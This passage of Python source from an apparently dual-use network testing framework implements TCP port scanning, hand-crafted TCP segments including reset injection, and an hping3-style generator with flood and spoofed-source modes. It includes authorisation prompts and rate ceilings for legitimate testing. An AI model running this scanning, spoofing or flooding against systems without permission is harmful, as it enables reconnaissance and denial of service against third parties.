            if alerts_armed():
                alert_port_open(str(target), probed_port, COMMON_PORTS.get(probed_port, ""),
                                review["detail"])
            out("  %s %-6d %-14s ttl=%-4s rtt=%-9s %s" % (
                c("OPEN  ", "bgreen", "bold"), probed_port,
                COMMON_PORTS.get(probed_port, "unknown"), review["ttl"],
                ("%s ms" % review["rtt_ms"]) if review["rtt_ms"] is not None else "-",
                c(review["detail"], "grey")))
        elif review["verdict"] != "OPEN":
            closed_ports.append(record)
            if show_closed:
                out("  %s %-6d %-14s %s" % (
                    c("CLOSED", "byellow"), probed_port,
                    COMMON_PORTS.get(probed_port, "unknown"), c(review["detail"], "grey")))
    for port in port_list:
        if port not in answered_ports:
            filtered_ports.append(port)
    stats.timeouts += len(filtered_ports)
    stats.stop()
    out("")
    kv_table([
        ("Target", target),
        ("Flags used", flags or "NULL"),
        ("Ports probed", len(port_list)),
        ("Open", c(len(open_ports), "bgreen")),
        ("Closed / reset", c(len(closed_ports), "byellow")),
        ("No response", c(len(filtered_ports), "grey")),
    ])
    stats.render()
    summary = OrderedDict([
        ("mode", "port-scan"),
        ("target", target),
        ("flags", flags or "NULL"),
        ("ports_probed", port_list),
        ("open", [record["port"] for record in open_ports]),
        ("closed", [record["port"] for record in closed_ports]),
        ("no_response", filtered_ports),
        ("services", {str(record["port"]): COMMON_PORTS.get(record["port"], "unknown")
                      for record in open_ports}),
        ("responses", results),
        ("traffic", stats.report()),
    ])
    artifact = LOGGER.scan("tcp_port_scan", summary, target=target)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def tcp_custom_send(target: str, port: int, flags: str, sport: Optional[int], seq: Optional[int],
                    ack_num: Optional[int], ttl: int, window: int, payload: bytes,
                    count: int, interval: float, timeout: float, df: bool,
                    iface: Optional[str]) -> Dict[str, Any]:
    """Fully manual segment injection: every header field operator-controlled."""
    if not require_scapy("TCP custom injector"):
        raise FrameworkError("scapy unavailable")
    stats = TrafficStats("tcp-custom %s:%d" % (target, port))
    results: List[Dict[str, Any]] = []
    for index in range(1, max(1, count) + 1):
        try:
            packet = PacketBuilder.tcp(target, port, flags=flags, sport=sport, ttl=ttl,
                                       window=window, seq=seq, ack_num=ack_num,
                                       payload=payload, df=df)
        except FrameworkError as exc:
            stats.record_error()
            err("packet %d build failure: %s" % (index, exc))
            continue
        stats.record_send()
        out("  [%d/%d] %s" % (index, count, c(PacketBuilder.packet_fingerprint(packet), "grey")))
        if payload:
            out(hexdump(payload, max_bytes=96))
        triples, _ = _tcp_exchange([packet], timeout, 0, 0.0, iface)
        if triples:
            _, received_packet, review = triples[0]
            stats.record_reply(review["rtt_ms"])
            out("        %s %s (ttl=%s rtt=%s)" % (
                c(review["verdict"], "bgreen" if review["verdict"] == "OPEN" else "byellow"),
                c(review["detail"], "grey"), review["ttl"], review["rtt_ms"]))
            results.append(OrderedDict([("sequence", index), ("verdict", review["verdict"]),
                                        ("detail", review["detail"]), ("rtt_ms", review["rtt_ms"])]))
        else:
            stats.record_timeout()
            out("        %s" % c("NO-RESPONSE (dropped/filtered)", "grey"))
            results.append(OrderedDict([("sequence", index), ("verdict", "NO-RESPONSE"),
                                        ("detail", "silence"), ("rtt_ms", None)]))
        if interval > 0 and index < count:
            try:
                time.sleep(min(interval, 120.0))
            except KeyboardInterrupt:
                warn("injection loop interrupted by operator.")
                break
    stats.stop()
    stats.render()
    summary = OrderedDict([
        ("mode", "custom-injection"),
        ("target", target), ("port", port), ("flags", flags or "NULL"),
        ("payload_hex", payload[:64].hex()), ("results", results),
        ("traffic", stats.report()),
    ])
    artifact = LOGGER.scan("tcp_custom", summary, target="%s:%d" % (target, port))
    if artifact:
        note("artefact: %s" % artifact)
    return summary


@module_guard("TCP Flag Crafter")
@root_required
def module_tcp_crafter(args: Optional[List[str]] = None) -> None:
    """Interactive TCP header-crafting suite with per-flag response analysis."""
    actions = OrderedDict([
        ("1", "Single TCP probe (target, port, flag mask, header tuning)"),
        ("2", "Flag matrix - differential response for SYN/ACK/FIN/RST/PSH/combinations"),
        ("3", "Multi-port flag scan (port list + chosen flags)"),
        ("4", "Raw segment injector (full manual header control + payload)"),
        ("5", "Flag reference table"),
        ("6", "ONLINE: service enrichment (TLS certificate, HTTP headers, RDAP)"),
        ("0", "Return to main menu"),
    ])
    while True:
        heading("MODULE 02 - TCP FLAG CRAFTER")
        for key, label in actions.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("tcp> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "6":
            online_tcp_console()
            continue
        if choice == "0":
            return
        if choice == "1":
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("unresolvable target '%s'." % target_raw)
                continue
            port_raw = prompt_text("destination port", default="80")
            if port_raw is PROMPT_ABORT:
                continue
            try:
                port = parse_port(port_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            flag_raw = prompt_text("flags (S, SA, FIN, RST, PSH, FPU, or 'null')", default="S")
            if flag_raw is PROMPT_ABORT:
                continue
            try:
                flags = parse_flag_spec(flag_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            timeout = prompt_float("timeout seconds", 0.1, 60.0, DEFAULT_TIMEOUT)
            if timeout is PROMPT_ABORT:
                continue
            ttl = prompt_int("TTL", 1, 255, 64)
            if ttl is PROMPT_ABORT:
                continue
            window = prompt_int("TCP window", 0, 65535, 64240)
            if window is PROMPT_ABORT:
                continue
            tcp_probe(target, port, flags, float(timeout), 0, 0.0, int(ttl), int(window))
        elif choice == "2":
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("unresolvable target '%s'." % target_raw)
                continue
            port_raw = prompt_text("destination port", default="80")
            if port_raw is PROMPT_ABORT:
                continue
            try:
                port = parse_port(port_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            tcp_flag_matrix(target, port)
        elif choice == "3":
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("unresolvable target '%s'." % target_raw)
                continue
            port_raw = prompt_text("ports (e.g. 22,80,1000-1010)", default="22,80,443")
            if port_raw is PROMPT_ABORT:
                continue
            try:
                ports = parse_port_list(port_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            flag_raw = prompt_text("flags", default="S")
            if flag_raw is PROMPT_ABORT:
                continue
            try:
                flags = parse_flag_spec(flag_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            timeout = prompt_float("timeout seconds", 0.1, 60.0, DEFAULT_TIMEOUT)
            if timeout is PROMPT_ABORT:
                continue
            interval = prompt_float("inter-packet interval seconds", 0.0, 5.0, 0.01)
            if interval is PROMPT_ABORT:
                continue
            display_closed = prompt_yes_no("display closed/reset ports as well?", False)
            tcp_port_scan(target, ports, flags, float(timeout), 0, float(interval),
                          show_closed=display_closed)
        elif choice == "4":
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("unresolvable target '%s'." % target_raw)
                continue
            port_raw = prompt_text("destination port", default="80")
            if port_raw is PROMPT_ABORT:
                continue
            try:
                port = parse_port(port_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            flag_raw = prompt_text("flags (e.g. PA, R, FA)", default="PA")
            if flag_raw is PROMPT_ABORT:
                continue
            try:
                flags = parse_flag_spec(flag_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            sport_raw = prompt_text("source port (blank = random)", default="", allow_blank=True)
            if sport_raw is PROMPT_ABORT:
                continue
            sport = None
            if str(sport_raw).strip():
                try:
                    sport = parse_port(sport_raw)
                except FrameworkError as exc:
                    err(str(exc))
                    continue
            seq_raw = prompt_text("sequence number (blank = random)", default="", allow_blank=True)
            if seq_raw is PROMPT_ABORT:
                continue
            seq = None
            if str(seq_raw).strip():
                try:
                    seq = int(str(seq_raw).strip(), 0) & 0xFFFFFFFF
                except ValueError:
                    warn("sequence '%s' unparsable - using random." % seq_raw)
            ack_raw = prompt_text("ack number (blank = none)", default="", allow_blank=True)
            if ack_raw is PROMPT_ABORT:
                continue
            ack = None
            if str(ack_raw).strip():
                try:
                    ack = int(str(ack_raw).strip(), 0) & 0xFFFFFFFF
                except ValueError:
                    warn("ack '%s' unparsable - omitted." % ack_raw)
            payload_raw = prompt_text("payload text (blank = none)", default="", allow_blank=True)
            if payload_raw is PROMPT_ABORT:
                continue
            payload = str(payload_raw).encode("utf-8", "replace") if str(payload_raw) else b""
            ttl = prompt_int("TTL", 1, 255, 64)
            if ttl is PROMPT_ABORT:
                continue
            window = prompt_int("TCP window", 0, 65535, 64240)
            if window is PROMPT_ABORT:
                continue
            count = prompt_int("repeat count", 1, MAX_TCP_PROBES, 1)
            if count is PROMPT_ABORT:
                continue
            interval = prompt_float("interval between injections", 0.0, 120.0, 1.0)
            if interval is PROMPT_ABORT:
                continue
            df_flag = prompt_yes_no("set the Don't-Fragment bit?", False)
            tcp_custom_send(target, port, flags, sport, seq, ack, int(ttl), int(window),
                            payload, int(count), float(interval), DEFAULT_TIMEOUT, df_flag, None)
        elif choice == "5":
            heading("TCP FLAG REFERENCE")
            reference = [
                ("S  SYN", "Connection initiation; SYN/ACK reply means OPEN, RST means CLOSED."),
                ("A  ACK", "Acknowledges data; bare ACK probes firewall state (RST = unfiltered)."),
                ("F  FIN", "Graceful termination; RST reply confirms a live closed port."),
                ("R  RST", "Tears a connection down; use for reset-injection testing."),
                ("P  PSH", "Pushes buffered data to the application layer."),
                ("U  URG", "Urgent-pointer data; rarely honoured by modern stacks."),
                ("E  ECE", "ECN echo; reveals ECN support when combined with CWR."),
                ("C  CWR", "Congestion window reduced; pair with ECE for ECN probing."),
                ("NULL \"\"", "No flags set - RFC 793 violation; OS fingerprint differentiator."),
                ("XMAS FPU", "FIN+PSH+URG - all-illuminated scan, RFC 793 violation."),
            ]
            for label, description in reference:
                out("  %s  %s" % (c(label.ljust(12), "cyan"), c(description, "grey")))
        else:
            warn("unrecognised selection '%s'." % choice)



# ===========================================================================
# MODULE 3 - HPING REPLICATOR (raw traffic generation / stress harness)
# ===========================================================================
class HpingReplicator:
    """
    Native re-implementation of the hping3 workflow in pure python + scapy.

    Design notes
    ------------
    * A background AsyncSniffer thread feeds a thread-safe deque, so packet
      transmission is never blocked by receive processing - the same model
      hping3 uses for accurate rate control.
    * Each probe carries a monotonically increasing sequence number; replies
      are matched back to their originating probe (by TCP/UDP source port for
      transport probes, by ICMP id/seq for echo probes, and by inner-header
      inspection for ICMP error messages).
    * Rate limiting is enforced: the configured packets-per-second figure is
      validated against MAX_PPS and HARD_PPS_CEILING, and flood mode requires
      an explicit, separate confirmation.
    """

    def __init__(self, target: str, protocol: str = "tcp", dport: int = 80,
                 sport: Optional[int] = None, flags: str = "S", count: int = 4,
                 interval: float = 1.0, ttl: int = 64, tos: int = 0, df: bool = False,
                 window: int = 64, data: bytes = b"", data_is_random: bool = False,
                 data_size: int = 0, rand_source_prefix: Optional[str] = None,
                 seq_start: int = 0, sport_increment: bool = False,
                 dport_increment: bool = False, idle_inc: int = 0,
                 reply_timeout: float = 3.0, iface: Optional[str] = None,
                 flood: bool = False, display_live: bool = True) -> None:
        self.target = target
        self.protocol = protocol.lower()
        self.dport = int(dport)
        self.sport = int(sport) if sport else None
        self.flags = flags
        self.count = int(count)
        self.interval = max(0.0, float(interval))
        self.ttl = int(ttl)
        self.tos = int(tos)
        self.df = bool(df)
        self.window = int(window)
        self.data = data
        self.data_is_random = bool(data_is_random)
        self.data_size = max(0, int(data_size))
        self.rand_source_prefix = rand_source_prefix
        self.seq_start = int(seq_start) & 0xFFFFFFFF
        self.sport_increment = bool(sport_increment)
        self.dport_increment = bool(dport_increment)
        self.reply_timeout = max(0.2, float(reply_timeout))
        self.iface = iface
        self.flood = bool(flood)
        self.display_live = bool(display_live)

        self.stats = TrafficStats("hping %s:%d %s" % (target, self.dport, self.protocol))
        self._queue: "deque[Any]" = deque()
        self._queue_lock = threading.Lock()
        self._pending: Dict[int, Dict[str, Any]] = {}
        self._pending_lock = threading.Lock()
        self._sniffer: Any = None
        self._stop_event = threading.Event()
        self._recent_frames: Dict[str, float] = {}
        self._dedupe_lock = threading.Lock()
        self.duplicate_frames = 0
        self.unmatched_frames = 0
        self._next_sport = self.sport or random_source_port()
        self._next_dport = self.dport
        self._identifier = random.randint(0, 0xFFFF)
        # An unbounded stress run previously grew this list forever; the rolling
        # horizon keeps the most recent replies for the report while the running
        # total preserves the true count (both bounded, both thread-visible).
        self.replies_seen: "deque[Dict[str, Any]]" = deque(maxlen=HPING_REPLY_HORIZON)
        self.replies_total = 0

    # -- sniff plumbing --------------------------------------------------
    def _capture_callback(self, packet: Any) -> None:
        with self._queue_lock:
            self._queue.append(packet)

    def _build_filter(self) -> str:
        """Conservative BPF filter; falls back to unfiltered capture on error."""
        try:
            ipaddress.IPv4Address(self.target)
            if self.protocol in ("tcp", "udp"):
                return "(tcp or udp or icmp) and (host %s)" % self.target
            return "icmp or host %s" % self.target
        except (ipaddress.AddressValueError, ValueError):
            return "icmp or tcp or udp"

    def _capture_interface(self) -> Optional[str]:
        """
        Choose the interface to listen on.

        Replies to a loopback target never traverse the default (routed)
        interface, so a naive sniffer on the default NIC records zero replies.
        Loopback targets therefore pin the capture socket to the loopback
        device (lo on Linux, lo0 on macOS/BSD).
        """
        if self.iface:
            return self.iface
        try:
            if not ipaddress.IPv4Address(self.target).is_loopback:
                return None
        except (ipaddress.AddressValueError, ValueError):
            return None
        candidates: List[str] = []
        # scapy knows the platform's loopback device name (lo on Linux, lo0 on
        # macOS/BSD, the Npcap loopback device path on Windows/Npcap); ask it first,
        # then the conventional names, then any adapter that merely looks like one.
        try:
            known = getattr(scapy_conf, "loopback_name", "")
            if known:
                candidates.append(str(known))
        except Exception:
            pass
        npcap_device = "".join([chr(92), "Device", chr(92), "NPF_Loopback"])
        candidates.extend(["lo", "lo0", npcap_device, "Npcap Loopback Adapter"])
        try:
            available = [str(name) for name in get_if_list()]
        except Exception:
            available = []
        lowered = {name.lower(): name for name in available}
        for candidate in candidates:
            if candidate in available:
                return candidate
            match = lowered.get(candidate.lower())
            if match:
                return match
        for name in available:
            if "loopback" in name.lower():
                return name
        # Nothing matched: let scapy choose its own loopback/default device rather
        # than handing a bogus device name to the capture socket.
        return None
    def _start_capture(self) -> bool:
        if not SCAPY_AVAILABLE or not hasattr(scapy, "AsyncSniffer"):
            warn("async capture unavailable - replies will not be timed (scapy AsyncSniffer missing).")
            return False
        capture_iface = self._capture_interface()
        attempts = [self._build_filter(), ""]
        for bpf in attempts:
            try:
                sniffer = scapy.AsyncSniffer(
                    prn=self._capture_callback,
                    store=False,
                    filter=bpf if bpf else None,
                    iface=capture_iface,
                )
                sniffer.start()
                time.sleep(0.25)  # let the capture socket bind before the first probe
                self._sniffer = sniffer
                return True
            except Exception as exc:  # capture socket/BPF failures are recoverable
                LOGGER.event("warn", "sniffer start attempt failed (%s): %s" % (bpf or "no-filter", exc),
                             level="WARN")
                continue
        warn("packet capture could not be established; switching to synchronous replies.")
        return False

    def _stop_capture(self) -> None:
        if not self._sniffer:
            return
        try:
            self._sniffer.stop()
        except Exception as exc:
            LOGGER.event("warn", "sniffer shutdown issue: %s" % exc, level="WARN")
        self._sniffer = None

    # -- probe construction ---------------------------------------------
    def _payload(self) -> bytes:
        if self.data:
            return self.data
        if self.data_is_random or self.data_size:
            size = self.data_size or 56
            try:
                return os.urandom(min(size, 65400))
            except NotImplementedError:
                return bytes(random.randint(0, 255) for _ in range(min(size, 65400)))
        return b""

    def build_probe(self, sequence: int) -> Tuple[Any, Dict[str, Any]]:
        """Construct the next probe plus the metadata needed to match its reply."""
        payload = self._payload()
        source = self.target
        if self.rand_source_prefix:
            try:
                base = ipaddress.IPv4Network(self.rand_source_prefix, strict=False)
                host_count = base.num_addresses
                if host_count > 1:
                    candidate = base.network_address + random.randint(1, host_count - 2)
                else:
                    candidate = base.network_address
                source = str(candidate)
            except (ValueError, ipaddress.NetmaskValueError):
                source = self.target
        sport = self._next_sport
        if self.sport_increment:
            self._next_sport = ((self._next_sport + 1) & 0xFFFF) or 1024
        dport = self._next_dport
        if self.dport_increment:
            self._next_dport = ((self._next_dport + 1) & 0xFFFF) or 1
        meta: Dict[str, Any] = OrderedDict([
            ("sequence", sequence), ("sport", sport), ("dport", dport),
            ("protocol", self.protocol), ("identifier", self._identifier),
            ("spoofed_source", source != self.target),
        ])
        if self.protocol == "tcp":
            packet = PacketBuilder.tcp(self.target, dport, flags=self.flags, sport=sport,
                                       ttl=self.ttl, window=self.window, payload=payload,
                                       df=self.df, tos=self.tos,
                                       seq=(self.seq_start + sequence) & 0xFFFFFFFF)
            packet.src = source
        elif self.protocol == "udp":
            packet = PacketBuilder.udp(self.target, dport, sport=sport, payload=payload, ttl=self.ttl)
            packet.src = source
            packet.tos = self.tos
        else:
            packet = PacketBuilder.icmp(self.target, icmp_type=8, code=0, ident=self._identifier,
                                        seq=sequence & 0xFFFF, payload=payload or b"PrismStrike-HPING",
                                        ttl=self.ttl)
            packet.src = source
        return packet, meta

    # -- reply matching ---------------------------------------------------
    def _frame_signature(self, packet: Any) -> str:
        """
        Stable identity for a captured frame, used to collapse duplicate reads.

        Linux delivers loopback traffic to a capture socket more than once, so
        an identical (src, sport, dst, dport, seq, ack, flags) tuple arriving
        within a few milliseconds is the same packet, not a second reply.
        """
        try:
            if packet.haslayer(TCP):
                tcp_layer = packet[TCP]
                return "T|%s|%s|%s|%s|%s|%s|%s" % (
                    packet[IP].src, tcp_layer.sport, packet[IP].dst, tcp_layer.dport,
                    int(tcp_layer.seq), int(tcp_layer.ack), str(tcp_layer.flags))
            if packet.haslayer(UDP):
                udp_layer = packet[UDP]
                return "U|%s|%s|%s|%s|%s" % (
                    packet[IP].src, udp_layer.sport, packet[IP].dst, udp_layer.dport,
                    len(bytes(udp_layer.payload)) if udp_layer.payload else 0)
            if packet.haslayer(ICMP):
                icmp_layer = packet[ICMP]
                return "I|%s|%s|%s|%s" % (
                    packet[IP].src, int(icmp_layer.type), int(icmp_layer.code),
                    int(getattr(icmp_layer, "seq", 0) or 0))
        except (AttributeError, IndexError, TypeError, ValueError):
            return ""
        return ""

    def _is_duplicate(self, packet: Any) -> bool:
        """True when this frame was already handled in the last 80 milliseconds."""
        signature = self._frame_signature(packet)
        if not signature:
            return False
        now = time.time()
        with self._dedupe_lock:
            previous = self._recent_frames.get(signature)
            if previous is not None and (now - previous) < 0.08:
                self.duplicate_frames += 1
                return True
            if len(self._recent_frames) > 4096:
                self._recent_frames = {key: value for key, value in self._recent_frames.items()
                                       if (now - value) < 5.0}
            self._recent_frames[signature] = now
        return False

    def _match_and_review(self, packet: Any) -> Optional[Dict[str, Any]]:
        """
        Correlate a captured packet with a pending probe and review it.

        Frames that match no outstanding probe are counted as foreign traffic
        and dropped: an outgoing probe re-read from the capture socket must
        never be reported as a reply from the target.
        """
        if not packet.haslayer(IP):
            return None
        if self._is_duplicate(packet):
            return None
        source_ip = str(packet[IP].src)
        match_seq: Optional[int] = None
        match_meta: Optional[Dict[str, Any]] = None
        try:
            if packet.haslayer(TCP):
                reply_dport = int(packet[TCP].dport)
                with self._pending_lock:
                    for sequence, meta in self._pending.items():
                        if meta["protocol"] == "tcp" and meta["sport"] == reply_dport:
                            match_seq, match_meta = sequence, meta
                            break
            elif packet.haslayer(UDP):
                reply_dport = int(packet[UDP].dport)
                with self._pending_lock:
                    for sequence, meta in self._pending.items():
                        if meta["protocol"] == "udp" and meta["sport"] == reply_dport:
                            match_seq, match_meta = sequence, meta
                            break
            elif packet.haslayer(ICMP):
                icmp_type = int(packet[ICMP].type)
                if icmp_type in (0, 14, 18):
                    reply_id = int(getattr(packet[ICMP], "id", -1))
                    reply_seq = int(getattr(packet[ICMP], "seq", -1))
                    with self._pending_lock:
                        for sequence, meta in self._pending.items():
                            if meta["protocol"] == "icmp" and meta["identifier"] == reply_id \
                                    and (sequence & 0xFFFF) == reply_seq:
                                match_seq, match_meta = sequence, meta
                                break
                elif icmp_type in (3, 11, 12, 5):
                    # ICMP error messages embed the original datagram payload.
                    inner = packet.getlayer(IP, 2)
                    if inner is not None:
                        if inner.haslayer(TCP):
                            inner_sport = int(inner[TCP].sport)
                            with self._pending_lock:
                                for sequence, meta in self._pending.items():
                                    if meta["protocol"] == "tcp" and meta["sport"] == inner_sport:
                                        match_seq, match_meta = sequence, meta
                                        break
                        elif inner.haslayer(UDP):
                            inner_sport = int(inner[UDP].sport)
                            with self._pending_lock:
                                for sequence, meta in self._pending.items():
                                    if meta["protocol"] == "udp" and meta["sport"] == inner_sport:
                                        match_seq, match_meta = sequence, meta
                                        break
        except (AttributeError, IndexError, KeyError, TypeError, ValueError):
            return None
        if match_seq is None:
            self.unmatched_frames += 1
            return None
        review = ReplyReviewer.review(packet, None)
        record = OrderedDict([
            ("sequence", match_seq if match_seq is not None else -1),
            ("matched", match_seq is not None),
            ("source", source_ip),
            ("verdict", review["verdict"]),
            ("flags", review["flags"]),
            ("ttl", review["ttl"]),
            ("ip_id", int(getattr(packet[IP], "id", 0))),
            ("length", len(bytes(packet))),
            ("window", int(packet[TCP].window) if packet.haslayer(TCP) else 0),
            ("sport", int(packet[TCP].sport) if packet.haslayer(TCP) else (
                int(packet[UDP].sport) if packet.haslayer(UDP) else 0)),
            ("icmp", review["icmp"]),
            ("arrived_at", time.time()),
        ])
        if match_seq is not None and match_meta is not None:
            # Claim the probe and read its send time in one lock transaction: a
            # reply can only ever consume its own pending entry once, and the
            # defaulted pop keeps a racing second reader from raising KeyError.
            with self._pending_lock:
                claimed = self._pending.pop(match_seq, None)
            sent_at = (claimed or match_meta).get("sent_at")
            if sent_at is not None:
                record["rtt_ms"] = round((record["arrived_at"] - sent_at) * 1000.0, 3)
            else:
                record["rtt_ms"] = None
        else:
            record["rtt_ms"] = None
        return record

    def _drain_replies(self, flush: bool = False) -> int:
        processed = 0
        while True:
            with self._queue_lock:
                if not self._queue:
                    break
                packet = self._queue.popleft()
            record = self._match_and_review(packet)
            if record is None:
                continue
            processed += 1
            self.replies_seen.append(record)
            self.replies_total += 1
            self.stats.record_reply(record["rtt_ms"],
                                    unreachable=record["verdict"] in (
                                        "HOST/NET-UNREACHABLE", "ADMIN-PROHIBITED",
                                        "PORT-UNREACHABLE"))
            if self.display_live:
                self._render_reply(record)
            if not flush and processed >= 256:
                break
        return processed

    def _render_reply(self, record: Dict[str, Any]) -> None:
        verdict_colour = "bgreen" if record["verdict"] in ("OPEN", "ECHO-REPLY") else (
            "byellow" if record["verdict"] not in ("NO-RESPONSE",) else "grey")
        out("  len=%-4d ip=%-15s ttl=%-4s id=%-5d sport=%-6s flags=%-6s seq=%-5s win=%-6s %s %s" % (
            record["length"], record["source"], record["ttl"], record["ip_id"], record["sport"],
            record["flags"] if record["flags"] != "-" else record["icmp"],
            record["sequence"] if record["sequence"] >= 0 else "unmatched",
            record["window"],
            ("rtt=%.2f ms" % record["rtt_ms"]) if record["rtt_ms"] is not None else "rtt=n/a",
            c(record["verdict"], verdict_colour),
        ))

    # -- main loop ---------------------------------------------------------
    def run(self) -> Dict[str, Any]:
        if not require_scapy("Hping replikator"):
            raise FrameworkError("scapy unavailable")
        try:
            ipaddress.IPv4Address(self.target)
            target_is_ip = True
        except (ipaddress.AddressValueError, ValueError):
            target_is_ip = False
        rate = (1.0 / self.interval) if self.interval > 0 else float(HARD_PPS_CEILING)
        if rate > HARD_PPS_CEILING:
            raise FrameworkError("requested rate %.0f pps exceeds the hard ceiling of %d pps"
                                 % (rate, HARD_PPS_CEILING))
        heading("HPING REPLICATOR - LIVE TRAFFIC")
        kv_table([
            ("Target", self.target + ("" if target_is_ip else " (unresolved - probe may fail)")),
            ("Protocol", self.protocol.upper()),
            ("Destination port", self.dport if self.protocol != "icmp" else "n/a (icmp)"),
            ("Flags", (self.flags or 'NULL("")') if self.protocol == "tcp" else "n/a"),
            ("Count", "unbounded (Ctrl-C to stop)" if self.count == 0 else self.count),
            ("Interval", "%.4fs (~%.1f pps)" % (self.interval, rate)),
            ("TTL / TOS", "%d / %d" % (self.ttl, self.tos)),
            ("Payload", "%d bytes%s" % (len(self._payload()),
                                        " (random)" if (self.data_is_random or self.data_size) else "")),
            ("Source", self.rand_source_prefix or "local interface address"),
            ("Interface", self.iface or "auto"),
            ("Reply timeout", "%.2fs" % self.reply_timeout),
        ])
        if self.rand_source_prefix:
            warn("spoofed source mode: replies will not return to this host (unicast reverse path).")
        if self.flood:
            warn("FLOOD MODE: transmission pacing is disabled - authorised stress tests only.")
        if not prompt_yes_no("Confirm you are authorised to send this traffic to %s" % self.target, False):
            warn("traffic generation cancelled by operator.")
            return OrderedDict([("aborted", True), ("target", self.target)])

        capture_ok = self._start_capture()
        if capture_ok:
            note("reply capture bound to interface: %s"
                 % (self._capture_interface() or "default route device"))
        out("")
        out(c("  seq      probe                                      reply", "bold"))
        out(c("  " + "-" * 96, "grey"))
        sequence = 0
        try:
            while True:
                if self.count and sequence >= self.count:
                    break
                if self._stop_event.is_set():
                    break
                try:
                    probe, meta = self.build_probe(sequence)
                except FrameworkError as exc:
                    self.stats.record_error()
                    err("probe %d construction failed: %s" % (sequence, exc))
                    sequence += 1
                    continue
                meta["sent_at"] = time.time()
                with self._pending_lock:
                    self._pending[sequence] = meta
                self.stats.record_send()
                sent_ok = True
                try:
                    send(probe, verbose=0, iface=self.iface)
                except PermissionError:
                    raise FrameworkError("raw socket permission denied - escalate privileges")
                except OSError as exc:
                    sent_ok = False
                    self.stats.record_error()
                    LOGGER.event("warn", "transmit error on seq %d: %s" % (sequence, exc), level="WARN")
                if self.display_live:
                    summary = PacketBuilder.packet_fingerprint(probe)
                    out("  %-8s %-44s %s" % (
                        sequence, c(summary[:44], "grey"),
                        c("send-error", "bred") if not sent_ok else ""))
                if capture_ok:
                    time.sleep(0.002)
                    self._drain_replies()
                else:
                    try:
                        kwargs: Dict[str, Any] = {"timeout": min(self.reply_timeout, 2.0), "verbose": 0}
                        if self.iface:
                            kwargs["iface"] = self.iface
                        reply = sr1(probe, **kwargs)
                    except (OSError, PermissionError) as exc:
                        reply = None
                        LOGGER.event("warn", "synchronous probe failed: %s" % exc, level="WARN")
                    if reply is not None:
                        with self._pending_lock:
                            self._pending.pop(sequence, None)
                        review = ReplyReviewer.review(reply, meta["sent_at"])
                        record = OrderedDict([
                            ("sequence", sequence), ("matched", True), ("source", review["source"]),
                            ("verdict", review["verdict"]), ("flags", review["flags"]),
                            ("ttl", review["ttl"]), ("ip_id", int(getattr(reply[IP], "id", 0)))
                            if reply.haslayer(IP) else 0,
                            ("length", len(bytes(reply))),
                            ("window", int(reply[TCP].window) if reply.haslayer(TCP) else 0),
                            ("sport", int(reply[TCP].sport) if reply.haslayer(TCP) else 0),
                            ("icmp", review["icmp"]), ("rtt_ms", review["rtt_ms"]),
                            ("arrived_at", time.time()),
                        ])
                        self.replies_seen.append(record)
                        self.replies_total += 1
                        self.stats.record_reply(record["rtt_ms"])
                        if self.display_live:
                            self._render_reply(record)
                sequence += 1
                if self.interval > 0 and not self.flood:
                    target_time = (meta["sent_at"] + self.interval)
                    drift = target_time - time.time()
                    if drift > 0:
                        time.sleep(drift)
        except KeyboardInterrupt:
            warn("transmission loop interrupted by operator.")
            LOGGER.event("interrupt", "hping loop interrupted", level="WARN")
        finally:
            deadline = time.time() + self.reply_timeout
            while time.time() < deadline:
                if capture_ok:
                    self._drain_replies()
                try:
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    break
            if capture_ok:
                self._drain_replies(flush=True)
            self._stop_capture()
            with self._pending_lock:
                unmatched = len(self._pending)
            self.stats.timeouts += unmatched
            self.stats.stop()
        out("")
        stats_report = self.stats.report()
        stats_report["unmatched_probes"] = unmatched
        stats_report["replies_captured"] = self.replies_total
        stats_report["reply_horizon_retained"] = len(self.replies_seen)
        self.stats.render()
        kv_table([
            ("Replies captured", stats_report["replies_captured"]),
            ("Probes without reply", unmatched),
            ("Duplicate loopback reads collapsed", self.duplicate_frames),
            ("Foreign frames ignored", self.unmatched_frames),
        ])
        summary = OrderedDict([
            ("mode", "hping-replication"),
            ("target", self.target),
            ("protocol", self.protocol),
            ("dport", self.dport),
            ("flags", self.flags or "NULL"),
            ("probes_sent", self.stats.sent),
            ("traffic", stats_report),
            ("replies", list(self.replies_seen)[:500]),
            ("replies_total", self.replies_total),
            ("reply_horizon", HPING_REPLY_HORIZON),
            ("duplicate_frames_collapsed", self.duplicate_frames),
            ("foreign_frames_ignored", self.unmatched_frames),
            ("capture_engine", "async-sniffer" if capture_ok else "synchronous-sr1"),
        ])
        artifact = LOGGER.scan("hping_replication", summary, target=self.target)
        if artifact:
            note("artefact: %s" % artifact)
        LOGGER.event("scan", "hping replication complete: %d probes, %d replies"
                     % (self.stats.sent, stats_report["replies_captured"]))
        return summary


@module_guard("Hping Replicator")
@root_required
def module_hping(args: Optional[List[str]] = None) -> None:
    """Interactive hping3-style traffic generator with full flag control."""
    actions = OrderedDict([
        ("1", "TCP probe stream (flags, ports, count, interval, payload)"),
        ("2", "UDP probe stream"),
        ("3", "ICMP echo stream"),
        ("4", "Flood-style paced blast (explicit confirmation required)"),
        ("5", "Spoofed-source probe stream (rand-source)"),
        ("6", "hping3 flag equivalence reference"),
        ("7", "ONLINE: telemetry relay (stream live probe results to a collector)"),
        ("0", "Return to main menu"),
    ])
    while True:
        heading("MODULE 03 - HPING REPLICATOR")
        for key, label in actions.items():
